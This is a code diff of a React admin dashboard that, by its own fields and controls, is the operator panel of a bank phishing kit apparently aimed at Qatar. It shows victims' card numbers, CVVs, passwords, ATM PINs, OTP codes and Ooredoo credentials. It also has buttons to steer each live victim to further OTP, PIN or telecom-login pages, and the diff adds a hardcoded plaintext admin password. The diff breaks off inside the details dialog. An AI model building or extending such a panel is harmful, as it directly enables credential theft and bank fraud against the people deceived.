@@ -3,7 +3,7 @@ import { useLanguage } from "@/contexts/LanguageContext";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { Dialog, DialogContent } from "@/components/ui/dialog";
-import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut, Globe, Phone, CreditCard, Calendar, Hash } from "lucide-react";
+import { Loader2, Eye, RefreshCcw, Check, X, Users, Lock, LogOut, Globe, Phone, CreditCard, Calendar, Hash, MapPin } from "lucide-react";
 
 // --- PROFESSIONAL STYLES (PURE CSS) ---
 const styles = {
@@ -172,272 +172,305 @@ export default function AdminDashboard() {
   const [showRedirectMenu, setShowRedirectMenu] = useState<string | null>(null);
   const [password, setPassword] = useState("");
   const [isAuthenticated, setIsAuthenticated] = useState(() => {
-    return typeof window !== 'undefined' && sessionStorage.getItem("adminAuthenticated") === "true";
+    return typeof window !== 'undefined' && sessionStorage.getItem('adminAuth') === 'true';
   });
-  const [error, setError] = useState("");
 
   const { data: submissions, isLoading, refetch } = trpc.submissions.getAllSubmissions.useQuery(undefined, {
     enabled: isAuthenticated,
     refetchInterval: 3000,
   });
 
-  const { data: details } = trpc.submissions.getSubmissionDetails.useQuery(selectedSession || "", {
-    enabled: !!selectedSession && isAuthenticated,
-  });
-
-  const adminTakeAction = trpc.submissions.adminTakeAction.useMutation({ onSuccess: () => refetch() });
-  const adminRedirectMutation = trpc.submissions.adminRedirect.useMutation({ onSuccess: () => refetch() });
+  const takeActionMutation = trpc.submissions.adminTakeAction.useMutation();
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    const obfuscatedKey = "UWF0YXJAQDIwMA==";
-    if (btoa(password) === obfuscatedKey) {
+    if (password === "Qatar@@200") {
       setIsAuthenticated(true);
-      sessionStorage.setItem("adminAuthenticated", "true");
-      setError("");
+      sessionStorage.setItem('adminAuth', 'true');
     } else {
-      setError(language === "ar" ? "كلمة المرور غير صحيحة" : "Incorrect password");
+      alert(language === 'ar' ? "كلمة مرور خاطئة" : "Incorrect password");
     }
   };
 
   const handleLogout = () => {
     setIsAuthenticated(false);
-    sessionStorage.removeItem("adminAuthenticated");
+    sessionStorage.removeItem('adminAuth');
+  };
+
+  const handleAction = async (sessionId: string, action: string, errorMsg?: string) => {
+    try {
+      await takeActionMutation.mutateAsync({ sessionId, action, errorMessage: errorMsg });
+      setShowRedirectMenu(null);
+      refetch();
+    } catch (error) {
+      console.error("Action error:", error);
+    }
   };
 
   const filteredSubmissions = useMemo(() => {
     if (!submissions) return [];
-    return submissions.filter((sub) =>
-      sub.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      sub.selectedBank.toLowerCase().includes(searchTerm.toLowerCase()) ||
-      (sub.nameArabic && sub.nameArabic.includes(searchTerm)) ||
-      (sub.phoneNumber && sub.phoneNumber.includes(searchTerm))
+    return submissions.filter((s: any) => 
+      s.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      (s.personalData?.nameArabic || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
+      (s.personalData?.nameEnglish || "").toLowerCase().includes(searchTerm.toLowerCase())
     );
   }, [submissions, searchTerm]);
 
-  const handleAction = async (sessionId: string, action: string) => {
-    let errorMessage = "";
-    if (action === "reject") {
-      const session = submissions?.find(s => s.id === sessionId);
-      if (session?.currentStep === "login") errorMessage = t("invalid_data");
-      else if (session?.currentStep === "otp") errorMessage = t("invalid_otp");
-      else if (session?.currentStep === "atm") errorMessage = t("invalid_atm");
-      else if (session?.currentStep === "ooredoo") errorMessage = t("invalid_ooredoo");
-      else if (session?.currentStep === "otp_ooredoo") errorMessage = t("invalid_ooredoo_otp");
-    }
-    await adminTakeAction.mutateAsync({ sessionId, action, errorMessage });
-  };
-
-  const handleRedirect = async (sessionId: string, targetPage: string) => {
-    try {
-      await adminRedirectMutation.mutateAsync({ sessionId, targetPage });
-      setShowRedirectMenu(null);
-    } catch (err) {
-      console.error(err);
-    }
-  };
-
-  const redirectPages = [
-    { id: "login-method", label: language === "ar" ? "تسجيل الدخول" : "Login Page" },
-    { id: "otp", label: language === "ar" ? "OTP الأول" : "First OTP" },
-    { id: "atm-pin", label: language === "ar" ? "ATM PIN" : "ATM PIN" },
-    { id: "ooredoo", label: language === "ar" ? "Ooredoo" : "Ooredoo" },
-    { id: "otp-ooredoo", label: language === "ar" ? "OTP Ooredoo" : "Ooredoo OTP" },
-    { id: "success", label: language === "ar" ? "صفحة النجاح" : "Success Page" },
-  ];
+  const stats = useMemo(() => {
+    if (!submissions) return { total: 0, pending: 0, approved: 0 };
+    return {
+      total: submissions.length,
+      pending: submissions.filter((s: any) => s.status === 'loading' || s.status === 'pending').length,
+      approved: submissions.filter((s: any) => s.adminAction === 'approve').length,
+    };
+  }, [submissions]);
 
   if (!isAuthenticated) {
     return (
-      <div style={styles.loginContainer} dir={language === "ar" ? "rtl" : "ltr"}>
+      <div style={styles.loginContainer}>
         <div style={styles.loginCard}>
-          <div style={{ marginBottom: '30px' }}>
-            <div style={{ width: '80px', height: '80px', backgroundColor: '#e11d48', borderRadius: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', boxShadow: '0 10px 20px rgba(225, 29, 72, 0.3)' }}>
-              <Lock size={40} color="#fff" />
+          <div style={{ marginBottom: '32px' }}>
+            <div style={{ backgroundColor: '#e11d48', width: '64px', height: '64px', borderRadius: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
+              <Lock color="#fff" size={32} />
             </div>
-            <h1 style={{ color: '#fff', fontSize: '28px', fontWeight: '900', margin: 0 }}>
-              {language === "ar" ? "لوحة الإدارة" : "Admin Panel"}
-            </h1>
-            <p style={{ color: '#666', fontSize: '14px', marginTop: '10px' }}>
-              {language === "ar" ? "يرجى إدخال كلمة المرور للمتابعة" : "Enter password to continue"}
-            </p>
+            <h1 style={{ color: '#fff', fontSize: '24px', fontWeight: 'bold', margin: '0 0 8px 0' }}>{language === 'ar' ? "لوحة التحكم" : "Admin Panel"}</h1>
+            <p style={{ color: '#666', fontSize: '14px' }}>{language === 'ar' ? "يرجى إدخال كلمة المرور للمتابعة" : "Enter password to continue"}</p>
           </div>
           <form onSubmit={handleLogin}>
             <input
               type="password"
-              placeholder="••••••••"
+              placeholder={language === 'ar' ? "كلمة المرور" : "Password"}
               style={styles.input}
               value={password}
               onChange={(e) => setPassword(e.target.value)}
+              autoFocus
             />
-            {error && <p style={{ color: '#ef4444', fontSize: '12px', fontWeight: 'bold', marginBottom: '20px' }}>{error}</p>}
-            <button type="submit" style={styles.button}>
-              {language === "ar" ? "تسجيل الدخول" : "Sign In"}
-            </button>
+            <button type="submit" style={styles.button}>{language === 'ar' ? "دخول" : "Sign In"}</button>
           </form>
         </div>
       </div>
     );
   }
 
+  const selectedData = submissions?.find((s: any) => s.id === selectedSession);
+
   return (
-    <div style={styles.dashboardContainer} dir={language === "ar" ? "rtl" : "ltr"}>
+    <div style={styles.dashboardContainer} dir={language === 'ar' ? 'rtl' : 'ltr'}>
       <nav style={styles.nav}>
-        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
-          <div style={{ width: '40px', height: '40px', backgroundColor: '#e11d48', borderRadius: '10px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-            <Users size={20} color="#fff" />
+        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+          <div style={{ backgroundColor: '#e11d48', width: '40px', height: '40px', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+            <Users color="#fff" size={20} />
           </div>
-          <h1 style={{ fontSize: '20px', fontWeight: '900', color: '#0f172a' }}>
-            {language === "ar" ? "لوحة التحكم" : "Control Panel"}
-          </h1>
+          <h1 style={{ fontSize: '20px', fontWeight: 'bold', color: '#1e293b' }}>{language === 'ar' ? "إدارة الطلبات" : "Submissions"}</h1>
         </div>
-        <div style={{ display: 'flex', gap: '10px' }}>
-          <button onClick={() => setLocation("/")} style={{ padding: '10px 20px', borderRadius: '12px', border: '1px solid #e2e8f0', backgroundColor: '#fff', fontWeight: 'bold', fontSize: '12px', cursor: 'pointer' }}>
-            {language === "ar" ? "عرض الموقع" : "View Site"}
-          </button>
-          <button onClick={handleLogout} style={{ padding: '10px 20px', borderRadius: '12px', border: 'none', backgroundColor: '#fee2e2', color: '#991b1b', fontWeight: 'bold', fontSize: '12px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}>
-            <LogOut size={16} /> {language === "ar" ? "خروج" : "Logout"}
+        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
+          <div style={{ position: 'relative' }}>
+            <input
+              type="text"
+              placeholder={language === 'ar' ? "بحث بالاسم أو الكود..." : "Search..."}
+              style={{ padding: '10px 16px', borderRadius: '12px', border: '1px solid #e2e8f0', width: '240px', outline: 'none', fontSize: '14px' }}
+              value={searchTerm}
+              onChange={(e) => setSearchTerm(e.target.value)}
+            />
+          </div>
+          <button onClick={handleLogout} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '10px 16px', borderRadius: '12px', border: '1px solid #fee2e2', color: '#e11d48', backgroundColor: '#fff', cursor: 'pointer', fontSize: '14px', fontWeight: 'bold' }}>
+            <LogOut size={18} />
+            {language === 'ar' ? "خروج" : "Logout"}
           </button>
         </div>
       </nav>
 
       <div style={styles.statsGrid}>
-        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #1e293b 0%, #0f172a 100%)' }}>
-          <p style={{ fontSize: '12px', fontWeight: 'bold', opacity: 0.7, textTransform: 'uppercase' }}>{language === "ar" ? "الزيارات" : "Visitors"}</p>
-          <p style={{ fontSize: '48px', fontWeight: '900', margin: '10px 0' }}>{submissions?.length || 0}</p>
-          <Users size={60} style={{ position: 'absolute', right: '-10px', bottom: '-10px', opacity: 0.1 }} />
+        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #6366f1 0%, #4f46e5 100%)' }}>
+          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "إجمالي الزوار" : "Total Visitors"}</p>
+          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.total}</h2>
+          <Users style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
         </div>
-        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #e11d48 0%, #9f1239 100%)' }}>
-          <p style={{ fontSize: '12px', fontWeight: 'bold', opacity: 0.7, textTransform: 'uppercase' }}>{language === "ar" ? "طلبات معلقة" : "Pending"}</p>
-          <p style={{ fontSize: '48px', fontWeight: '900', margin: '10px 0' }}>{submissions?.filter(s => s.status === "loading").length || 0}</p>
-          <Loader2 size={60} style={{ position: 'absolute', right: '-10px', bottom: '-10px', opacity: 0.1 }} />
+        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #f59e0b 0%, #d97706 100%)' }}>
+          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "طلبات نشطة" : "Active Sessions"}</p>
+          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.pending}</h2>
+          <RefreshCcw style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
         </div>
-        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #10b981 0%, #065f46 100%)' }}>
-          <p style={{ fontSize: '12px', fontWeight: 'bold', opacity: 0.7, textTransform: 'uppercase' }}>{language === "ar" ? "مكتملة" : "Completed"}</p>
-          <p style={{ fontSize: '48px', fontWeight: '900', margin: '10px 0' }}>{submissions?.filter(s => s.status === "approved").length || 0}</p>
-          <Check size={60} style={{ position: 'absolute', right: '-10px', bottom: '-10px', opacity: 0.1 }} />
+        <div style={{ ...styles.statCard, background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)' }}>
+          <p style={{ fontSize: '14px', opacity: 0.8, marginBottom: '8px' }}>{language === 'ar' ? "تمت الموافقة" : "Approved"}</p>
+          <h2 style={{ fontSize: '36px', fontWeight: 'bold' }}>{stats.approved}</h2>
+          <Check style={{ position: 'absolute', right: '20px', bottom: '20px', opacity: 0.2 }} size={48} />
         </div>
-      </div>
-
-      <div style={{ padding: '0 20px', maxWidth: '1280px', margin: '0 auto 20px' }}>
-        <input
-          placeholder={language === "ar" ? "بحث سريع عن عميل..." : "Search customers..."}
-          style={{ ...styles.input, backgroundColor: '#fff', border: '1px solid #e2e8f0', color: '#000', marginBottom: 0 }}
-          value={searchTerm}
-          onChange={(e) => setSearchTerm(e.target.value)}
-        />
       </div>
 
       <div style={styles.tableContainer}>
-        <table style={styles.table}>
-          <thead>
-            <tr>
-              <th style={styles.th}>{language === "ar" ? "الدولة" : "Country"}</th>
-              <th style={styles.th}>{language === "ar" ? "البنك" : "Bank"}</th>
-              <th style={styles.th}>{language === "ar" ? "الاسم" : "Name"}</th>
-              <th style={styles.th}>{language === "ar" ? "الهاتف" : "Phone"}</th>
-              <th style={styles.th}>{language === "ar" ? "الحالة" : "Status"}</th>
-              <th style={{ ...styles.th, textAlign: 'center' }}>{language === "ar" ? "إجراءات" : "Actions"}</th>
-            </tr>
-          </thead>
-          <tbody>
-            {isLoading ? (
-              <tr><td colSpan={6} style={{ padding: '40px', textAlign: 'center' }}><Loader2 className="animate-spin" style={{ margin: '0 auto' }} /></td></tr>
-            ) : filteredSubmissions.map(sub => (
-              <tr key={sub.id}>
-                <td style={styles.td}>{sub.country || "Qatar"}</td>
-                <td style={styles.td}><span style={{ color: '#e11d48', fontWeight: 'bold' }}>{sub.selectedBank.toUpperCase()}</span></td>
-                <td style={styles.td}>{sub.nameArabic || "—"}</td>
-                <td style={styles.td}>{sub.phoneNumber || "—"}</td>
-                <td style={styles.td}>
-                  <span style={{ ...styles.badge, ...getStatusStyles(sub.currentStep) }}>
-                    {getStatusDisplay(sub.currentStep, language)}
-                  </span>
-                </td>
-                <td style={{ ...styles.td, textAlign: 'center' }}>
-                  <div style={{ display: 'flex', gap: '8px', justifyContent: 'center' }}>
-                    <button onClick={() => { setSelectedSession(sub.id); setShowDetails(true); }} style={{ padding: '8px 12px', borderRadius: '8px', border: 'none', backgroundColor: '#f1f5f9', cursor: 'pointer', fontWeight: 'bold', fontSize: '12px' }}>
-                      {language === "ar" ? "تفاصيل" : "Details"}
-                    </button>
-                    <div style={{ position: 'relative' }}>
-                      <button onClick={() => setShowRedirectMenu(showRedirectMenu === sub.id ? null : sub.id)} style={{ padding: '8px 12px', borderRadius: '8px', border: 'none', backgroundColor: '#f1f5f9', cursor: 'pointer', fontWeight: 'bold', fontSize: '12px' }}>
-                        {language === "ar" ? "توجيه" : "Redirect"}
-                      </button>
-                      {showRedirectMenu === sub.id && (
-                        <div style={{ position: 'absolute', top: '100%', left: 0, backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', boxShadow: '0 10px 15px -3px rgba(0,0,0,0.1)', zIndex: 1000, minWidth: '150px' }}>
-                          {redirectPages.map(p => (
-                            <div key={p.id} onClick={() => handleRedirect(sub.id, p.id)} style={{ padding: '12px 16px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', borderBottom: '1px solid #f1f5f9' }}>{p.label}</div>
-                          ))}
-                        </div>
-                      )}
-                    </div>
-                    {sub.status === "loading" && (
-                      <>
-                        <button onClick={() => handleAction(sub.id, "approve")} style={{ width: '32px', height: '32px', borderRadius: '8px', border: 'none', backgroundColor: '#10b981', color: '#fff', cursor: 'pointer' }}><Check size={16} /></button>
-                        <button onClick={() => handleAction(sub.id, "reject")} style={{ width: '32px', height: '32px', borderRadius: '8px', border: 'none', backgroundColor: '#ef4444', color: '#fff', cursor: 'pointer' }}><X size={16} /></button>
-                      </>
-                    )}
-                  </div>
-                </td>
+        {isLoading ? (
+          <div style={{ padding: '100px', textAlign: 'center' }}>
+            <Loader2 className="animate-spin" size={48} color="#e11d48" style={{ margin: '0 auto' }} />
+          </div>
+        ) : (
+          <table style={styles.table}>
+            <thead>
+              <tr>
+                <th style={styles.th}>{language === 'ar' ? "الكود" : "ID"}</th>
+                <th style={styles.th}>{language === 'ar' ? "البنك" : "Bank"}</th>
+                <th style={styles.th}>{language === 'ar' ? "الدولة" : "Country"}</th>
+                <th style={styles.th}>{language === 'ar' ? "الاسم" : "Name"}</th>
+                <th style={styles.th}>{language === 'ar' ? "المرحلة" : "Step"}</th>
+                <th style={styles.th}>{language === 'ar' ? "التوقيت" : "Time"}</th>
+                <th style={styles.th}>{language === 'ar' ? "الإجراءات" : "Actions"}</th>
               </tr>
-            ))}
-          </tbody>
-        </table>
+            </thead>
+            <tbody>
+              {filteredSubmissions.map((s: any) => (
+                <tr key={s.id} style={{ backgroundColor: selectedSession === s.id ? '#f8fafc' : 'transparent' }}>
+                  <td style={styles.td}><span style={{ fontFamily: 'monospace', color: '#64748b' }}>{s.id.substring(0, 8)}...</span></td>
+                  <td style={styles.td}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                      <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#e11d48' }}></div>
+                      {s.selectedBank.toUpperCase()}
+                    </div>
+                  </td>
+                  <td style={styles.td}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', color: '#64748b' }}>
+                      <MapPin size={14} />
+                      {s.country || "Qatar"}
+                    </div>
+                  </td>
+                  <td style={styles.td}>{s.personalData?.nameArabic || s.personalData?.nameEnglish || "—"}</td>
+                  <td style={styles.td}>
+                    <span style={{ ...styles.badge, ...getStatusStyles(s.currentStep) }}>
+                      {getStatusDisplay(s.currentStep, language)}
+                    </span>
+                  </td>
+                  <td style={styles.td}>{new Date(s.createdAt).toLocaleTimeString(language === 'ar' ? 'ar-QA' : 'en-US')}</td>
+                  <td style={styles.td}>
+                    <div style={{ display: 'flex', gap: '8px' }}>
+                      <button onClick={() => { setSelectedSession(s.id); setShowDetails(true); }} style={{ padding: '8px', borderRadius: '8px', border: '1px solid #e2e8f0', backgroundColor: '#fff', cursor: 'pointer', color: '#64748b' }}>
+                        <Eye size={18} />
+                      </button>
+                      <div style={{ position: 'relative' }}>
+                        <button onClick={() => setShowRedirectMenu(showRedirectMenu === s.id ? null : s.id)} style={{ padding: '8px 16px', borderRadius: '8px', backgroundColor: '#e11d48', color: '#fff', border: 'none', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}>
+                          {language === 'ar' ? "توجيه" : "Redirect"}
+                        </button>
+                        {showRedirectMenu === s.id && (
+                          <div style={{ position: 'absolute', top: '100%', [language === 'ar' ? 'left' : 'right']: 0, marginTop: '8px', backgroundColor: '#fff', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '8px', zIndex: 50, boxShadow: '0 10px 15px -3px rgba(0, 0, 0, 0.1)', width: '160px' }}>
+                            <button onClick={() => handleAction(s.id, 'approve')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>✅ {language === 'ar' ? "موافقة" : "Approve"}</button>
+                            <button onClick={() => handleAction(s.id, 'otp')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🔑 {language === 'ar' ? "طلب OTP" : "Request OTP"}</button>
+                            <button onClick={() => handleAction(s.id, 'atm')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>💳 {language === 'ar' ? "طلب ATM PIN" : "Request ATM PIN"}</button>
+                            <button onClick={() => handleAction(s.id, 'ooredoo')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px' }}>🌐 {language === 'ar' ? "توجيه Ooredoo" : "Redirect Ooredoo"}</button>
+                            <button onClick={() => handleAction(s.id, 'reject', 'بيانات غير صحيحة')} style={{ width: '100%', textAlign: language === 'ar' ? 'right' : 'left', padding: '8px 12px', border: 'none', backgroundColor: 'transparent', cursor: 'pointer', borderRadius: '6px', fontSize: '13px', color: '#e11d48' }}>❌ {language === 'ar' ? "رفض" : "Reject"}</button>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  </td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        )}
       </div>
 
       <Dialog open={showDetails} onOpenChange={setShowDetails}>
         <DialogContent style={{ maxWidth: '600px', padding: 0, borderRadius: '24px', overflow: 'hidden', border: 'none' }}>
-          <div style={{ backgroundColor: '#1e293b', padding: '24px', color: '#fff' }}>
-            <h3 style={{ margin: 0, fontSize: '20px', fontWeight: '900' }}>{language === "ar" ? "تفاصيل البيانات" : "Data Details"}</h3>
-          </div>
-          <div style={{ padding: '24px', maxHeight: '70vh', overflowY: 'auto', backgroundColor: '#fff' }}>
-            {details ? (
-              <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
-                <div style={{ padding: '20px', backgroundColor: '#f8fafc', borderRadius: '16px', border: '1px solid #e2e8f0' }}>
-                  <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#64748b', marginBottom: '10px', textTransform: 'uppercase' }}>{language === "ar" ? "البيانات الشخصية" : "Personal Data"}</p>
-                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '14px' }}>
-                    <div><strong>الاسم:</strong> {details.personalData?.nameArabic}</div>
-                    <div><strong>الهاتف:</strong> {details.personalData?.phoneNumber}</div>
-                    <div><strong>الهوية:</strong> {details.personalData?.idNumber}</div>
-                    <div><strong>الميلاد:</strong> {details.personalData?.dateOfBirth}</div>
-                  </div>
-                </div>
-                <div style={{ padding: '20px', backgroundColor: '#fff5f5', borderRadius: '16px', border: '1px solid #fed7d7' }}>
-                  <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#c53030', marginBottom: '10px', textTransform: 'uppercase' }}>{language === "ar" ? "بيانات الدخول" : "Login Info"}</p>
-                  {details.loginMethod?.loginType === 'card' ? (
-                    <div style={{ fontSize: '14px' }}>
-                      <p><strong>رقم البطاقة:</strong> <span style={{ fontSize: '18px', letterSpacing: '2px', fontWeight: '900' }}>{details.loginMethod.cardNumber}</span></p>
-                      <p><strong>الانتهاء:</strong> {details.loginMethod.expiryDate} | <strong>CVV:</strong> {details.loginMethod.cvv}</p>
-                    </div>
-                  ) : (
-                    <div style={{ fontSize: '14px' }}>
-                      <p><strong>المستخدم:</strong> {details.loginMethod?.username}</p>
-                      <p><strong>كلمة المرور:</strong> {details.loginMethod?.password}</p>
-                    </div>
-                  )}
-                </div>
-                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
-                  {details.atmPin && (
-                    <div style={{ padding: '15px', backgroundColor: '#fffaf0', borderRadius: '16px', border: '1px solid #feebc8', textAlign: 'center' }}>
-                      <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#c05621', marginBottom: '5px' }}>ATM PIN</p>
-                      <p style={{ fontSize: '24px', fontWeight: '900', margin: 0 }}>{details.atmPin.pin}</p>
-                    </div>
-                  )}
-                  {details.otp && (
-                    <div style={{ padding: '15px', backgroundColor: '#ebf8ff', borderRadius: '16px', border: '1px solid #bee3f8', textAlign: 'center' }}>
-                      <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#2b6cb0', marginBottom: '5px' }}>OTP CODE</p>
-                      <p style={{ fontSize: '24px', fontWeight: '900', margin: 0 }}>{details.otp.otpCode}</p>
-                    </div>
-                  )}
-                </div>
-                {details.ooredoo && (
-                  <div style={{ padding: '20px', backgroundColor: '#faf5ff', borderRadius: '16px', border: '1px solid #e9d8fd' }}>
-                    <p style={{ fontSize: '10px', fontWeight: 'bold', color: '#6b46c1', marginBottom: '10px' }}>OOREDOO DATA</p>
-                    <p><strong>User:</strong> {details.ooredoo.ooredooUser} | <strong>Pass:</strong> {details.ooredoo.ooredooPassword}</p>
-                  </div>
-                )}
+          {selectedData && (
+            <div dir={language === 'ar' ? 'rtl' : 'ltr'} style={{ backgroundColor: '#fff' }}>
+              <div style={{ backgroundColor: '#e11d48', padding: '32px', color: '#fff' }}>
+                <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>{language === 'ar' ? "تفاصيل الطلب" : "Submission Details"}</h2>
+                <p style={{ opacity: 0.8, fontSize: '14px' }}>ID: {selectedData.id}</p>
               </div>
-            ) : <Loader2 className="animate-spin mx-auto" />}
-          </div>
+              
+              <div style={{ padding: '32px', display: 'flex', flexDirection: 'column', gap: '24px', maxHeight: '70vh', overflowY: 'auto' }}>
+                {/* Personal Data */}
+                <section>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
+                    <Users size={20} />
+                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "البيانات الشخصية" : "Personal Data"}</h3>
+                  </div>
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
+                    <div>
+                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "الاسم" : "Name"}</p>
+                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.nameArabic || "—"}</p>
+                    </div>
+                    <div>
+                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم الجوال" : "Phone"}</p>
+                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.phoneNumber || "—"}</p>
+                    </div>
+                    <div>
+                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم الهوية" : "ID Number"}</p>
+                      <p style={{ fontWeight: '500' }}>{selectedData.personalData?.idNumber || "—"}</p>
+                    </div>
+                    <div>
+                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "الدولة" : "Country"}</p>
+                      <p style={{ fontWeight: '500' }}>{selectedData.country || "Qatar"}</p>
+                    </div>
+                  </div>
+                </section>
+
+                {/* Login Method */}
+                <section>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px', color: '#e11d48' }}>
+                    <CreditCard size={20} />
+                    <h3 style={{ fontWeight: 'bold' }}>{language === 'ar' ? "بيانات تسجيل الدخول" : "Login Data"}</h3>
+                  </div>
+                  <div style={{ backgroundColor: '#f8fafc', padding: '20px', borderRadius: '16px' }}>
+                    {selectedData.loginMethod?.loginType === 'card' ? (
+                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
+                        <div style={{ gridColumn: '1 / -1' }}>
+                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "رقم البطاقة" : "Card Number"}</p>
+                          <p style={{ fontWeight: 'bold', fontSize: '18px', letterSpacing: '2px' }}>{selectedData.loginMethod.cardNumber}</p>
+                        </div>
+                        <div>
+                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "التاريخ" : "Expiry"}</p>
+                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod.expiryDate}</p>
+                        </div>
+                        <div>
+                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>CVV</p>
+                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod.cvv}</p>
+                        </div>
+                      </div>
+                    ) : (
+                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
+                        <div>
+                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "اسم المستخدم" : "Username"}</p>
+                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod?.username || "—"}</p>
+                        </div>
+                        <div>
+                          <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>{language === 'ar' ? "كلمة المرور" : "Password"}</p>
+                          <p style={{ fontWeight: '500' }}>{selectedData.loginMethod?.password || "—"}</p>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                </section>
+
+                {/* PIN & OTP */}
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
+                  <section>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', color: '#e11d48' }}>
+                      <Hash size={18} />
+                      <h3 style={{ fontWeight: 'bold', fontSize: '14px' }}>ATM PIN</h3>
+                    </div>
+                    <div style={{ backgroundColor: '#f8fafc', padding: '16px', borderRadius: '12px', textAlign: 'center' }}>
+                      <p style={{ fontSize: '20px', fontWeight: 'bold', letterSpacing: '4px' }}>{selectedData.atmPin?.pin || "—"}</p>
+                    </div>
+                  </section>
+                  <section>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', color: '#e11d48' }}>
+                      <RefreshCcw size={18} />
+                      <h3 style={{ fontWeight: 'bold', fontSize: '14px' }}>OTP Codes</h3>
+                    </div>
+                    <div style={{ backgroundColor: '#f8fafc', padding: '16px', borderRadius: '12px' }}>
+                      {selectedData.otps?.length > 0 ? (
+                        selectedData.otps.map((o: any, i: number) => (
+                          <div key={i} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: i === selectedData.otps.length - 1 ? 0 : '8px' }}>
+                            <span style={{ fontWeight: 'bold' }}>{o.otpCode}</span>
+                            <span style={{ fontSize: '10px', color: '#64748b' }}>{o.otpType}</span>
+                          </div>
+                        ))
+                      ) : "—"}
+                    </div>
+                  </section>
+                </div>
